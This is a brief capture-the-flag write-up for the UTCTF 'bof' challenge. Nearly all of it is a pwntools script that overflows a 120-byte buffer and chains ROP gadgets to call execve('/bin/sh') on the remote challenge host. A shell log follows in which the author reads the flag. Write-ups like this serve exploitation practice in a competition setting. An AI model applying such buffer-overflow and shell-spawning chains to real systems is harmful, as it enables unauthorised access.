# bof (211 solves)

```python
from pwn import *

debug = False

def main():
    if debug:
        r = process('pwnable')
    else:
        r = remote('binary.utctf.live', 9002)
    rop = b''
    rop += b'A' * 120     # padding
    rop += p64(0x400693) # pop rdi
    rop += p64(0x400700) # /bin/sh
    rop += p64(0x400691) # pop rsi pop r15
    rop += p64(0)        # rsi
    rop += p64(0)        # r15
    rop += p64(0x400451) # ret
    rop += p64(0x400490) # execve
    r.sendline(rop)
    r.interactive()


if __name__ == "__main__":
    main()
```

```
$ ls
flag.txt
$ cat flag.txt
utflag{thanks_for_the_string_!!!!!!}                          
```

